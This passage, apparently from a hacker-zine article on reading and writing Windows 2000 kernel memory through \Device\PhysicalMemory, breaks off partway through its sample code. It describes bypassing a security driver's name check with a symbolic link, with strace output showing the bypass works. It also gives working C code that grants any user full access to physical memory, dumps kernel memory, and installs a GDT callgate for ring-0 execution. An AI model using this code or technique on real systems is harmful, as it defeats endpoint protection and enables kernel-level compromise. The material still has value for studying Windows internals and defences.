+ + 532   msdev.exe
+ + 604   ssh.exe
+ + 704   Livekd.exe
+ + 716   i386kd.exe
+ + 448   uedit32.exe
+ + 260   winkps.exe
+
+3 sections mapping + 1 for selecting the first entry (process) looks good.
+I will just briefly describe the winkps.c but better take time to read the
+code.
+
+Flow of winkps.c
+ - GetSystemInfo()
+   grab Allocation granularity on the system. (used for calculating offset
+   on address translation).
+   
+ - LoadLibrary()
+   get the address of MmGetPhysicalAddress in ntoskrnl.exe. This can also
+   be done by parsing the PE header.
+   
+ - NtOpenSection()
+   open \Device\PhysicalMemory r/w.
+   
+ - InstallCallgate()
+   Map the section for install/remove callgate and install the callgate  
+   using second argument as callgate function.
+
+ - DisplayProcesses()
+   main loop. Errors are catched by the execption handler.
+   I do this in order to try cleaning the callgate even if there is an
+   error like access violation (could happend if bad mapping).
+   
+- UninstallCallgate()
+  Remove the callgate and unmap the mapping of the section.
+
+- NtClose()
+  Simply close the opened HANDLE :)
+
+Now it's time you to read the code and try to recode winkdump.c with a
+better address translation support using a callgate :>
+
+
+----[ 4.5 Bonus Track
+
+As far as i know, the only product that try to restrict access to
+\Device\PhysicalMemory is "Integrity Protection Driver (IPD)" from Pedestal
+Software (see [6]).
+
+---
+from README:
+    The IPD forbids any process from opening \Device\PhysicalMemory.
+---
+
+ok so .. let's say we want to use ipd and we still want to play with
+\Device\PhysicalMemory heh :). I don't really know if this product is well-
+known but anyway i wanted to bypass its protection.
+In order to restrict access to \Device\PhysicalMemory IPD hooks
+ZwOpenSection() and check that the Section being opened is not called
+"\Device\PhysicalMemory".
+
+---
+from h_mem.c
+   if (restrictEnabled()) {
+      if (ObjectAttributes && ObjectAttributes->ObjectName &&
+          ObjectAttributes->ObjectName->Length>0) {
+          if (_wcsicmp(ObjectAttributes->ObjectName->Buffer,
+                       L"\\Device\\PhysicaMemory")==0) {
+             WCHAR buf[200];
+             swprintf(buf,
+                      L"Blocking device/PhysicalMemory access,
+                      procid=0x%x\n", PsGetCurrentProcessId());
+             debugOutput(buf);
+             return STATUS_ACCESS_DENIED;
+          }
+       }
+    }
+---
+
+_wcsicmp() perform a lowercase comparison of 2 Unicode buffer so if we find
+a way to open the object using another name we are done :).
+In first chapter we have seen that there were a symbolic link object type
+so what's about creating a symbolic link object linked to
+\Device\PhysicalMemory ?
+By looking at ntdll.dll export table, you can find a function called
+"NtCreateSymbolicLinkObject" but like most of interesting things it's not
+documented. The prototype is like this:
+
+NTSTATUS NtCreateSymbolicLinkObject(PHANDLE SymLinkHandle,
+                                    ACCESS_MASK DesiredAccess,
+                                    POBJECT_ATTRIBUTES ObAttributes,
+                                    PUNICODE_STRING ObName);
+
+So we just have to call this function with "\Device\PhysicalMemory" as the
+ObName and we set our new name in the OBJECT_ATTRIBUTES structures. We use
+"\??\" as root directory for our object so the name is now
+"\??\hack_da_ipd".
+At the beginning i was asking myself how the kernel would resolve the
+symbolic link when calling NtOpenSection with "\??\hack_da_ipd". If
+NtOpenSection was checking that the destination object is a symbolic link
+and then recall NtOpenSection with the real name of the object, our
+symbolic link would be useless because IPD could detect it.
+So i straced it:
+
+---
+[...]
+3 NtCreateSymbolicLinkObject(0x1, {24, 0, 0x40, 0, 0,
+     "\??\hack_da_ipd"}, 1245028, ... 48, ) == 0x0
+4 NtAllocateVirtualMemory(-1, 1244448, 0, 1244480, 4096, 4, ... ) == 0x0
+5 NtRequestWaitReplyPort(36, {124, 148, 0, 16711934, 4222620, 256, 0}, ...           
+     {124, 148, 2, 868, 840, 7002, 0}, ) == 0x0
+6 NtOpenSection (0x4, {24, 0, 0x40, 0, 0, "\??\hack_da_ipd"}, ... 44, )  
+     == 0x0
+7 NtRequestWaitReplyPort (36, {124, 148, 0, 868, 840, 7002, 0}, ... {124,
+     148, 2, 868, 840, 7003, 0}, ) == 0x0
+8 NtClose (44, ... ) == 0x0
+9 NtClose (48, ... ) == 0x0
+[...]
+---
+
+(a strace for Windows is avaible at BindView's RAZOR web site. see [7])
+
+As you can see NtOpenSection doesn't recall itself with the real name of
+the object so all is good.
+At this point \Device\PhysicalMemory is our so IPD is 100% corrupted :p as
+we can read/write whereever we want in the memory.
+Remember that you must run this program with user SYSTEM.
+
+
+--[ 5 - Sample code
+
+LICENSE:
+Sample code provided with the article may be copied/duplicated and modified
+in any form as long as this copyright is prepended unmodified.
+Code are proof of concept and the author can and must not be made
+responsible for any damage/data loss.
+Use this code at your own risk.
+
+                                            crazylord / CNS
+
+
+----[ 5.1 kmem.h
+
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+#define OBJ_CASE_INSENSITIVE 0x00000040L
+#define OBJ_KERNEL_HANDLE    0x00000200L
+
+typedef LONG NTSTATUS;
+#define STATUS_SUCCESS       (NTSTATUS) 0x00000000L
+#define STATUS_ACCESS_DENIED (NTSTATUS) 0xC0000022L
+
+#define MAKE_DWORD(_l, _h) (DWORD) (_l | (_h << 16))
+
+typedef struct _OBJECT_ATTRIBUTES {
+    ULONG Length;
+    HANDLE RootDirectory;
+    PUNICODE_STRING ObjectName;
+    ULONG Attributes;
+    PVOID SecurityDescriptor;
+    PVOID SecurityQualityOfService;
+} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
+
+// useful macros
+#define InitializeObjectAttributes( p, n, a, r, s ) { \
+    (p)->Length = sizeof( OBJECT_ATTRIBUTES );        \
+    (p)->RootDirectory = r;                           \
+    (p)->Attributes = a;                              \
+    (p)->ObjectName = n;                              \
+    (p)->SecurityDescriptor = s;                      \
+    (p)->SecurityQualityOfService = NULL;             \
+    }
+
+#define INIT_UNICODE(_var,_buffer)            \
+        UNICODE_STRING _var = {               \
+            sizeof (_buffer) - sizeof (WORD), \
+            sizeof (_buffer),                 \
+            _buffer }
+
+// callgate info
+typedef struct _KGDTENTRY {
+   WORD LimitLow;
+   WORD BaseLow;
+   WORD BaseHigh;
+} KGDTENTRY, *PKGDTENTRY;
+
+typedef struct _CALLGATE_DESCRIPTOR {
+   USHORT offset_0_15;
+   USHORT selector;
+   UCHAR  param_count :4;
+   UCHAR  some_bits   :4;
+   UCHAR  type        :4;
+   UCHAR  app_system  :1;
+   UCHAR  dpl         :2;
+   UCHAR  present     :1;
+   USHORT offset_16_31;
+} CALLGATE_DESCRIPTOR, *PCALLGATE_DESCRIPTOR;
+
+// section info
+typedef LARGE_INTEGER PHYSICAL_ADDRESS, *PPHYSICAL_ADDRESS;
+typedef enum _SECTION_INHERIT {
+    ViewShare = 1,
+    ViewUnmap = 2
+} SECTION_INHERIT;
+
+typedef struct _MAPPING {
+/*000*/ PHYSICAL_ADDRESS pAddress;
+/*008*/ PVOID            vAddress;
+/*00C*/ DWORD            Offset;
+/*010*/ } MAPPING, *PMAPPING;
+
+// symlink info
+#define SYMBOLIC_LINK_QUERY                              (0x0001)
+#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)
+
+// process info
+// Flink to _EPROCESS
+#define TO_EPROCESS(_a) ((DWORD) _a - 0xA0)
+// Flink to UniqueProcessId
+#define TO_PID(_a) (DWORD) ((DWORD) _a - 0x4)
+// Flink to ImageFileName
+#define TO_PNAME(_a) (PCHAR) ((DWORD) _a + 0x15C)
+
+typedef struct _DISPATCHER_HEADER {
+/*000*/ UCHAR Type;
+/*001*/ UCHAR Absolute;
+/*002*/ UCHAR Size;
+/*003*/ UCHAR Inserted;
+/*004*/ LONG SignalState;
+/*008*/ LIST_ENTRY WaitListHead;
+/*010*/ } DISPATCHER_HEADER;
+
+typedef struct _KEVENT {
+/*000*/ DISPATCHER_HEADER Header;
+/*010*/ } KEVENT, *PKEVENT;
+
+typedef struct _FAST_MUTEX {
+/*000*/ LONG Count;
+/*004*/ PVOID Owner;
+/*008*/ ULONG Contention;
+/*00C*/ KEVENT Event;
+/*01C*/ ULONG OldIrql;
+/*020*/ } FAST_MUTEX, *PFAST_MUTEX;
+
+// the two following definition come from w2k_def.h by Sven B. Schreiber
+typedef struct _MMSUPPORT {
+/*000*/ LARGE_INTEGER LastTrimTime;
+/*008*/ DWORD         LastTrimFaultCount;
+/*00C*/ DWORD         PageFaultCount;
+/*010*/ DWORD         PeakWorkingSetSize;
+/*014*/ DWORD         WorkingSetSize;
+/*018*/ DWORD         MinimumWorkingSetSize;
+/*01C*/ DWORD         MaximumWorkingSetSize;
+/*020*/ PVOID         VmWorkingSetList;
+/*024*/ LIST_ENTRY    WorkingSetExpansionLinks;
+/*02C*/ BOOLEAN       AllowWorkingSetAdjustment;
+/*02D*/ BOOLEAN       AddressSpaceBeingDeleted;
+/*02E*/ BYTE          ForegroundSwitchCount;
+/*02F*/ BYTE          MemoryPriority;
+/*030*/ } MMSUPPORT, *PMMSUPPORT;
+
+typedef struct _IO_COUNTERS {
+/*000*/ ULONGLONG  ReadOperationCount;
+/*008*/ ULONGLONG  WriteOperationCount;
+/*010*/ ULONGLONG  OtherOperationCount;
+/*018*/ ULONGLONG ReadTransferCount;
+/*020*/ ULONGLONG WriteTransferCount;
+/*028*/ ULONGLONG OtherTransferCount;
+/*030*/ } IO_COUNTERS, *PIO_COUNTERS;
+
+// this is a very simplified version :) of the EPROCESS
+// structure.
+
+typedef struct _EPROCESS {
+/*000*/ BYTE                   Pcb[0x6C];
+/*06C*/ NTSTATUS               ExitStatus;
+/*070*/ KEVENT                 LockEvent;
+/*080*/ DWORD                  LockCount;
+/*084*/ DWORD                  dw084;
+/*088*/ LARGE_INTEGER          CreateTime;
+/*090*/ LARGE_INTEGER          ExitTime;
+/*098*/ PVOID                  LockOwner;
+/*09C*/ DWORD                  UniqueProcessId;
+/*0A0*/ LIST_ENTRY             ActiveProcessLinks; // see PsActiveListHead
+/*0A8*/ DWORD                  QuotaPeakPoolUsage[2]; // NP, P
+/*0B0*/ DWORD                  QuotaPoolUsage[2]; // NP, P
+/*0B8*/ DWORD                  PagefileUsage;
+/*0BC*/ DWORD                  CommitCharge;
+/*0C0*/ DWORD                  PeakPagefileUsage;
+/*0C4*/ DWORD                  PeakVirtualSize;
+/*0C8*/ LARGE_INTEGER          VirtualSize;
+/*0D0*/ MMSUPPORT              Vm;
+/*100*/ LIST_ENTRY             SessionProcessLinks;
+/*108*/ DWORD                  dw108[6];
+/*120*/ PVOID                  DebugPort;
+/*124*/ PVOID                  ExceptionPort;
+/*128*/ PVOID                  ObjectTable;
+/*12C*/ PVOID                  Token;
+/*130*/ FAST_MUTEX             WorkingSetLock;
+/*150*/ DWORD                  WorkingSetPage;
+/*154*/ BOOLEAN                ProcessOutswapEnabled;
+/*155*/ BOOLEAN                ProcessOutswapped;
+/*156*/ BOOLEAN                AddressSpaceInitialized;
+/*157*/ BOOLEAN                AddressSpaceDeleted;
+/*158*/ FAST_MUTEX             AddressCreationLock;
+/*178*/ KSPIN_LOCK             HyperSpaceLock;
+/*17C*/ DWORD                  ForkInProgress;
+/*180*/ WORD                   VmOperation;
+/*182*/ BOOLEAN                ForkWasSuccessful;
+/*183*/ BYTE                   MmAgressiveWsTrimMask;
+/*184*/ DWORD                  VmOperationEvent;
+/*188*/ PVOID                  PaeTop;
+/*18C*/ DWORD                  LastFaultCount;
+/*190*/ DWORD                  ModifiedPageCount;
+/*194*/ PVOID                  VadRoot;
+/*198*/ PVOID                  VadHint;
+/*19C*/ PVOID                  CloneRoot;
+/*1A0*/ DWORD                  NumberOfPrivatePages;
+/*1A4*/ DWORD                  NumberOfLockedPages;
+/*1A8*/ WORD                   NextPageColor;
+/*1AA*/ BOOLEAN                ExitProcessCalled;
+/*1AB*/ BOOLEAN                CreateProcessReported;
+/*1AC*/ HANDLE                 SectionHandle;
+/*1B0*/ PVOID                  Peb;
+/*1B4*/ PVOID                  SectionBaseAddress;
+/*1B8*/ PVOID                  QuotaBlock;
+/*1BC*/ NTSTATUS               LastThreadExitStatus;
+/*1C0*/ DWORD                  WorkingSetWatch;
+/*1C4*/ HANDLE                 Win32WindowStation;
+/*1C8*/ DWORD                  InheritedFromUniqueProcessId;
+/*1CC*/ ACCESS_MASK            GrantedAccess;
+/*1D0*/ DWORD                  DefaultHardErrorProcessing; // HEM_*
+/*1D4*/ DWORD                  LdtInformation;
+/*1D8*/ PVOID                  VadFreeHint;
+/*1DC*/ DWORD                  VdmObjects;
+/*1E0*/ PVOID                  DeviceMap;
+/*1E4*/ DWORD                  SessionId;
+/*1E8*/ LIST_ENTRY             PhysicalVadList;
+/*1F0*/ PVOID                  PageDirectoryPte;
+/*1F4*/ DWORD                  dw1F4;
+/*1F8*/ DWORD                  PaePageDirectoryPage;
+/*1FC*/ CHAR                   ImageFileName[16];
+/*20C*/ DWORD                  VmTrimFaultValue;
+/*210*/ BYTE                   SetTimerResolution;
+/*211*/ BYTE                   PriorityClass;
+/*212*/ WORD                   SubSystemVersion;
+/*214*/ PVOID                  Win32Process;
+/*218*/ PVOID                  Job;
+/*21C*/ DWORD                  JobStatus;
+/*220*/ LIST_ENTRY             JobLinks;
+/*228*/ PVOID                  LockedPagesList;
+/*22C*/ PVOID                  SecurityPort;
+/*230*/ PVOID                  Wow64;
+/*234*/ DWORD                  dw234;
+/*238*/ IO_COUNTERS            IoCounters;
+/*268*/ DWORD                  CommitChargeLimit;
+/*26C*/ DWORD                  CommitChargePeak;
+/*270*/ LIST_ENTRY             ThreadListHead;
+/*278*/ PVOID                  VadPhysicalPagesBitMap;
+/*27C*/ DWORD                  VadPhysicalPages;
+/*280*/ DWORD                  AweLock;
+/*284*/ } EPROCESS, *PEPROCESS;
+
+
+// copy ntdll.lib from Microsoft DDK to current directory
+#pragma comment(lib, "ntdll")
+#define IMP_SYSCALL __declspec(dllimport) NTSTATUS _stdcall 
+
+IMP_SYSCALL
+NtMapViewOfSection(HANDLE SectionHandle,
+                   HANDLE ProcessHandle,
+                   PVOID *BaseAddress,
+                   ULONG ZeroBits,
+                   ULONG CommitSize,
+                   PLARGE_INTEGER SectionOffset,
+                   PSIZE_T ViewSize,
+                   SECTION_INHERIT InheritDisposition,
+                   ULONG AllocationType,
+                   ULONG Protect);
+
+IMP_SYSCALL
+NtUnmapViewOfSection(HANDLE ProcessHandle,
+                     PVOID BaseAddress);
+
+IMP_SYSCALL
+NtOpenSection(PHANDLE SectionHandle,
+              ACCESS_MASK DesiredAccess,
+              POBJECT_ATTRIBUTES ObjectAttributes);
+
+IMP_SYSCALL
+NtClose(HANDLE Handle);
+
+IMP_SYSCALL
+NtCreateSymbolicLinkObject(PHANDLE SymLinkHandle,
+                           ACCESS_MASK DesiredAccess,
+                           POBJECT_ATTRIBUTES ObjectAttributes,
+                           PUNICODE_STRING TargetName);
+
+
+----[ 5.2 chmod_mem.c
+
+#include <stdio.h>
+#include <windows.h>
+#include <aclapi.h>
+#include "..\kmem.h"
+
+void usage(char *n) {
+   printf("usage: %s (/current | /user) [who]\n", n);
+   printf("/current: add all access to current user\n");
+   printf("/user   : add all access to user 'who'\n");
+   exit(0);
+}
+
+int main(int argc, char **argv) {
+   HANDLE               Section;
+   DWORD                Res;
+   NTSTATUS             ntS;
+   PACL                 OldDacl=NULL, NewDacl=NULL;
+   PSECURITY_DESCRIPTOR SecDesc=NULL;
+   EXPLICIT_ACCESS      Access;
+   OBJECT_ATTRIBUTES    ObAttributes;
+   INIT_UNICODE(ObName, L"\\Device\\PhysicalMemory");
+   BOOL                 mode;
+
+   if (argc < 2)
+      usage(argv[0]);
+
+   if (!strcmp(argv[1], "/current")) {
+      mode = 1;
+   } else if (!strcmp(argv[1], "/user") && argc == 3) {
+     mode = 2;
+   } else
+      usage(argv[0]);
+
+   memset(&Access, 0, sizeof(EXPLICIT_ACCESS));
+   InitializeObjectAttributes(&ObAttributes,
+                              &ObName,
+                              OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+                              NULL,
+                              NULL);
+
+   // open handle de \Device\PhysicalMemory
+   ntS = NtOpenSection(&Section, WRITE_DAC | READ_CONTROL, &ObAttributes);
+   if (ntS != STATUS_SUCCESS) {
+      printf("error: NtOpenSection (code: %x)\n", ntS);
+      goto cleanup;
+   }
+   
+   // retrieve a copy of the security descriptor
+   Res = GetSecurityInfo(Section, SE_KERNEL_OBJECT, 
+                         DACL_SECURITY_INFORMATION, NULL, NULL, &OldDacl,
+                         NULL, &SecDesc);
+   if (Res != ERROR_SUCCESS) {
+      printf("error: GetSecurityInfo (code: %lu)\n", Res);
+      goto cleanup;
+   }
+
+   Access.grfAccessPermissions = SECTION_ALL_ACCESS; // :P
+   Access.grfAccessMode        = GRANT_ACCESS;
+   Access.grfInheritance       = NO_INHERITANCE;
+   Access.Trustee.MultipleTrusteeOperation = NO_MULTIPLE_TRUSTEE;
+   // change these informations to grant access to a group or other user
+   Access.Trustee.TrusteeForm  = TRUSTEE_IS_NAME;
+   Access.Trustee.TrusteeType  = TRUSTEE_IS_USER;
+   if (mode == 1)
+      Access.Trustee.ptstrName = "CURRENT_USER";
+   else
+     Access.Trustee.ptstrName = argv[2];
+
+   // create the new ACL
+   Res = SetEntriesInAcl(1, &Access, OldDacl, &NewDacl);
+   if (Res != ERROR_SUCCESS) {
+      printf("error: SetEntriesInAcl (code: %lu)\n", Res);
+      goto cleanup;
+   }
+
+   // update ACL
+   Res = SetSecurityInfo(Section, SE_KERNEL_OBJECT,
+                         DACL_SECURITY_INFORMATION, NULL, NULL, NewDacl, 
+                         NULL);
+   if (Res != ERROR_SUCCESS) {
+      printf("error: SetEntriesInAcl (code: %lu)\n", Res);
+      goto cleanup;
+   }
+   printf("\\Device\\PhysicalMemory chmoded\n");
+   
+cleanup:
+   if (Section)
+      NtClose(Section);
+   if (SecDesc)
+      LocalFree(SecDesc);
+   return(0);
+}
+
+
+----[ 5.3 winkdump.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+
+#include "..\kmem.h"
+
+ULONG   Granularity;
+
+// thanx to kraken for the hexdump function
+void hexdump(unsigned char *data, unsigned int amount) {
+   unsigned int      dp, p;
+   const char        trans[] =
+      "................................ !\"#$%&'()*+,-./0123456789"
+      ":;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklm"
+      "nopqrstuvwxyz{|}~...................................."
+      "....................................................."
+      "........................................";
+
+   for (dp = 1; dp <= amount; dp++)  {
+      printf ("%02x ", data[dp-1]);
+      if ((dp % 8) == 0)
+         printf (" ");
+      if ((dp % 16) == 0) {
+         printf ("| ");
+         p = dp;
+         for (dp -= 16; dp < p; dp++)
+            printf ("%c", trans[data[dp]]);
+         printf ("\n");
+      }
+   }
+   if ((amount % 16) != 0) {
+      p = dp = 16 - (amount % 16);
+      for (dp = p; dp > 0; dp--) {
+         printf ("   ");
+         if (((dp % 8) == 0) && (p != 8))
+            printf (" ");
+      }
+      printf (" | ");
+      for (dp = (amount - (16 - p)); dp < amount; dp++)
+         printf ("%c", trans[data[dp]]);
+   }
+   printf ("\n");
+   return ;
+}
+
+PHYSICAL_ADDRESS GetPhysicalAddress(ULONG vAddress) {
+   PHYSICAL_ADDRESS  add;
+   
+   if (vAddress < 0x80000000L || vAddress >= 0xA0000000L)
+      add.QuadPart = (ULONGLONG) vAddress & 0xFFFF000;
+   else
+      add.QuadPart = (ULONGLONG) vAddress & 0x1FFFF000;
+   return(add);
+}
+
+int InitSection(PHANDLE Section) {
+   NTSTATUS          ntS;
+   OBJECT_ATTRIBUTES ObAttributes;
+   INIT_UNICODE(ObString, L"\\Device\\PhysicalMemory");
+   
+   InitializeObjectAttributes(&ObAttributes,
+                              &ObString,
+                              OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+                              NULL,
+                              NULL);
+   
+   // open \Device\PhysicalMemory
+   ntS = NtOpenSection(Section,
+                       SECTION_MAP_READ,
+                       &ObAttributes);
+   
+   if (ntS != STATUS_SUCCESS) {
+      printf(" * error NtOpenSection (code: %x)\n", ntS);
+      return(0);
+   }
+   return(1);
+}
+
+int main(int argc, char **argv) {
+   NTSTATUS         ntS;
+   ULONG            Address, Size, MappedSize, Offset;
+   HANDLE           Section;
+   PVOID            MappedAddress=NULL;
+   SYSTEM_INFO      SysInfo;
+   PHYSICAL_ADDRESS pAddress;
+   
+   printf(" *** win2k memory dumper ***\n\n");
+   
+   if (argc != 3) {
+      printf("usage: %s <address> <size>\n", argv[0]);
+      return(0);
+   }
+   
+   Address = strtoul(argv[1], NULL, 0);
+   MappedSize = Size = strtoul(argv[2], NULL, 10);
+   printf(" Virtual Address       : 0x%.8x\n", Address);
+   
+   if (!Size) {
+      printf("error: invalid size\n");
+      return(0);
+   }
+   
+   // get allocation granularity information
+   GetSystemInfo(&SysInfo);
+   Granularity = SysInfo.dwAllocationGranularity;
+   printf(" Allocation granularity: %lu bytes\n", Granularity);
+   if (!InitSection(&Section))
+      return(0);
+   
+   Offset = Address % Granularity;
+   MappedSize += Offset; // reajust mapping view
+   printf(" Offset                : 0x%x\n", Offset);
+   pAddress = GetPhysicalAddress(Address - Offset);
+   printf(" Physical Address      : 0x%.16x\n", pAddress);
+
+   ntS = NtMapViewOfSection(Section, (HANDLE) -1, &MappedAddress, 0L,
+                            MappedSize, &pAddress, &MappedSize, ViewShare,
+                            0, PAGE_READONLY);
+
+   printf(" Mapped size           : %lu bytes\n", MappedSize);
+   printf(" View size             : %lu bytes\n\n", Size);
+
+   if (ntS == STATUS_SUCCESS) {
+      hexdump((char *)MappedAddress+Offset, Size);
+      NtUnmapViewOfSection((HANDLE) -1, MappedAddress);
+   } else {
+      if (ntS == 0xC00000F4L)
+         printf("error: invalid physical address translation\n");
+      else
+         printf("error: NtMapViewOfSection (code: %x)\n", ntS);
+   }
+
+   NtClose(Section);
+   return(0);
+}
+
+
+----[ 5.2 winkps.c
+
+// code very messy but working :)
+#include <stdio.h>
+#include <windows.h>
+#include "..\kmem.h"
+
+// get this address from win2k symbols
+#define PSADD    0x8046A180 // PsActiveProcessHead
+// default base address for ntoskrnl.exe on win2k
+#define BASEADD 0x7FFE0000 // MmGetPhysicalAddress
+// max process, to prevent easy crashing
+#define MAX_PROCESS 50
+
+typedef struct _MY_CG {
+   PHYSICAL_ADDRESS     pAddress;
+   PVOID                MappedAddress;
+   PCALLGATE_DESCRIPTOR Desc;
+   WORD                 Segment;
+   WORD                 LastEntry;
+} MY_CG, *PMY_CG;
+
+ULONG         Granularity;
+PLIST_ENTRY   PsActiveProcessHead = (PLIST_ENTRY) PSADD;
+MY_CG         GdtMap;
+MAPPING       CurMap;
+
+PHYSICAL_ADDRESS (*MmGetPhysicalAddress) (PVOID BaseAddress);
+
+void __declspec(naked) Ring0Func() {
+   _asm {
+      pushad
+      pushf
+      cli
+
+      mov esi, CurMap.vAddress
+      push esi
+      call MmGetPhysicalAddress
+      mov CurMap.pAddress, eax  // save low part of LARGE_INTEGER
+      mov [CurMap+4], edx       // save high part of LARGE_INTEGER
+
+      popf
+      popad
+      retf
+   }
+}
+
+// function which call the callgate
+PHYSICAL_ADDRESS NewGetPhysicalAddress(PVOID vAddress) {
+   WORD   farcall[3];
+   HANDLE Thread = GetCurrentThread();
+
+   farcall[2] = GdtMap.Segment;
+
+   if(!VirtualLock((PVOID) Ring0Func, 0x30)) {
+      printf("error: unable to lock function\n");
+      CurMap.pAddress.QuadPart = 1;
+   } else {
+      CurMap.vAddress = vAddress; // ugly way to pass argument
+      CurMap.Offset   = (DWORD) vAddress % Granularity;
+      (DWORD) CurMap.vAddress -= CurMap.Offset;
+
+      SetThreadPriority(Thread, THREAD_PRIORITY_TIME_CRITICAL);
+      Sleep(0);
+
+      _asm call fword ptr [farcall]
+
+      SetThreadPriority(Thread,THREAD_PRIORITY_NORMAL);
+      VirtualUnlock((PVOID) Ring0Func, 0x30);
+   }
+   return(CurMap.pAddress);
+}
+
+PHYSICAL_ADDRESS GetPhysicalAddress(ULONG vAddress) {
+   PHYSICAL_ADDRESS  add;
+
+    if (vAddress < 0x80000000L || vAddress >= 0xA0000000L) {
+      add.QuadPart = (ULONGLONG) vAddress & 0xFFFF000;
+   } else {
+      add.QuadPart = (ULONGLONG) vAddress & 0x1FFFF000;
+   }
+   return(add);
+}
+
+void UnmapMemory(PVOID MappedAddress) {
+   NtUnmapViewOfSection((HANDLE) -1, MappedAddress);
+}
+
+int InstallCallgate(HANDLE Section, DWORD Function) {
+   NTSTATUS             ntS;
+   KGDTENTRY            gGdt;
+   DWORD                Size;
+   PCALLGATE_DESCRIPTOR CgDesc;
+
+   _asm sgdt gGdt;
+
+   printf("virtual address of GDT : 0x%.8x\n",
+          MAKE_DWORD(gGdt.BaseLow, gGdt.BaseHigh));
+   GdtMap.pAddress =
+              GetPhysicalAddress(MAKE_DWORD(gGdt.BaseLow, gGdt.BaseHigh));
+   printf("physical address of GDT: 0x%.16x\n", GdtMap.pAddress.QuadPart);
+   
+   Size = gGdt.LimitLow;
+   ntS = NtMapViewOfSection(Section, (HANDLE) -1, &GdtMap.MappedAddress,
+                            0L, Size, &GdtMap.pAddress, &Size, ViewShare,
+                            0, PAGE_READWRITE);
+   if (ntS != STATUS_SUCCESS || !GdtMap.MappedAddress) {
+      printf("error: NtMapViewOfSection (code: %x)\n", ntS);
+      return(0);
+   }
+
+   GdtMap.LastEntry = gGdt.LimitLow & 0xFFF8; // offset to last entry
+   for(CgDesc = (PVOID) ((DWORD)GdtMap.MappedAddress+GdtMap.LastEntry),
+       GdtMap.Desc=NULL;
+       (DWORD) CgDesc > (DWORD) GdtMap.MappedAddress;
+       CgDesc--) {
+      
+      //printf("present:%x, type:%x\n", CgDesc->present, CgDesc->type);
+      if(CgDesc->present == 0){
+         CgDesc->offset_0_15  = (WORD) (Function & 0xFFFF);
+         CgDesc->selector     = 8;
+         CgDesc->param_count  = 0; //1;
+         CgDesc->some_bits    = 0;
+         CgDesc->type         = 12;     // 32-bits callgate junior :>
+         CgDesc->app_system   = 0;      // A system segment
+         CgDesc->dpl          = 3;      // Ring 3 code can call
+         CgDesc->present      = 1;
+         CgDesc->offset_16_31 = (WORD) (Function >> 16);
+         GdtMap.Desc = CgDesc;
+         break;
+      }
+
+   }
+
+   if (GdtMap.Desc == NULL) {
+      printf("error: unable to find free entry for installing callgate\n");
+      printf("       not normal by the way .. your box is strange =]\n");
+   }
+
+   GdtMap.Segment =
+      ((WORD) ((DWORD) CgDesc - (DWORD) GdtMap.MappedAddress))|3;
+   printf("Allocated segment      : %x\n", GdtMap.Segment);
+   return(1);
+}
+
+int UninstallCallgate(HANDLE Section, DWORD Function) {
+   PCALLGATE_DESCRIPTOR CgDesc;
+
+   for(CgDesc = (PVOID) ((DWORD) GdtMap.MappedAddress+GdtMap.LastEntry);
+       (DWORD) CgDesc > (DWORD) GdtMap.MappedAddress;
+      CgDesc--) {
+      
+      if((CgDesc->offset_0_15 == (WORD) (Function & 0xFFFF))
+         && CgDesc->offset_16_31 == (WORD) (Function >> 16)){
+         memset(CgDesc, 0, sizeof(CALLGATE_DESCRIPTOR));
+         return(1);
+      }
+   }
+   NtUnmapViewOfSection((HANDLE) -1, GdtMap.MappedAddress);
+   return(0);
+}
+
+void UnmapVirtualMemory(PVOID vAddress) {
+   NtUnmapViewOfSection((HANDLE) -1, vAddress);
+}
+
+PVOID MapVirtualMemory(HANDLE Section, PVOID vAddress, DWORD Size) {
+   PHYSICAL_ADDRESS pAddress;
+   NTSTATUS         ntS;
+   DWORD            MappedSize;
+   PVOID            MappedAddress=NULL;
+
+   //printf("* vAddress: 0x%.8x\n", vAddress);
+   pAddress = NewGetPhysicalAddress((PVOID) vAddress);
+   //printf("* vAddress: 0x%.8x (after rounding, offset: 0x%x)\n",
+   //       CurMap.vAddress, CurMap.Offset);
+   //printf("* pAddress: 0x%.16x\n", pAddress);
+
+   // check for error (1= impossible value)
+   if (pAddress.QuadPart != 1) {
+      Size += CurMap.Offset; // adjust mapping view
+      MappedSize = Size;
+
+      ntS = NtMapViewOfSection(Section, (HANDLE) -1, &MappedAddress,
+                         0L, Size, &pAddress, &MappedSize, ViewShare,
+                         0, PAGE_READONLY);
+      if (ntS != STATUS_SUCCESS || !MappedSize) {
+         printf(" error: NtMapViewOfSection, mapping 0x%.8x (code: %x)\n",
+                vAddress, ntS);
+         return(NULL);
+      }
+   } else
+      MappedAddress = NULL;
+   printf("mapped 0x%x bytes @ 0x%.8x (init Size: 0x%x bytes)\n",
+         MappedSize, MappedAddress, Size);
+   return(MappedAddress);
+}
+
+void DisplayProcesses(HANDLE Section) {
+   int i = 0;
+   DWORD     Padding;
+   PEPROCESS CurProcess, NextProcess;
+   PVOID     vCurEntry, vOldEntry, NewMappedAddress;
+   PLIST_ENTRY PsCur;
+
+   // first we map PsActiveProcessHead to get first entry
+   vCurEntry = MapVirtualMemory(Section, PsActiveProcessHead, 4);
+   if (!vCurEntry)
+      return;
+   PsCur = (PLIST_ENTRY) ((DWORD) vCurEntry + CurMap.Offset);
+   
+   // most of EPROCESS struct are located around 0xfc[e-f]00000
+   // so we map 0x100000 bytes (~ 1mb) to avoid heavy mem mapping
+   while (PsCur->Flink != PsActiveProcessHead && i<MAX_PROCESS) {
+      NextProcess = (PEPROCESS) TO_EPROCESS(PsCur->Flink);
+      //printf("==> Current process: %x\n", CurProcess);
+
+      // we map 0x100000 bytes view so we store offset to EPROCESS
+      Padding = TO_EPROCESS(PsCur->Flink) & 0xFFFFF;
+
+      // check if the next struct is already mapped in memory
+      if ((DWORD) vCurEntry<= (DWORD) NextProcess 
+         && (DWORD)NextProcess+sizeof(EPROCESS)<(DWORD)vCurEntry+0x100000){
+         // no need to remap
+         // no remapping so we need to calculate the new address
+         CurProcess = (PEPROCESS) ((DWORD) NewMappedAddress + Padding);
+
+      } else {
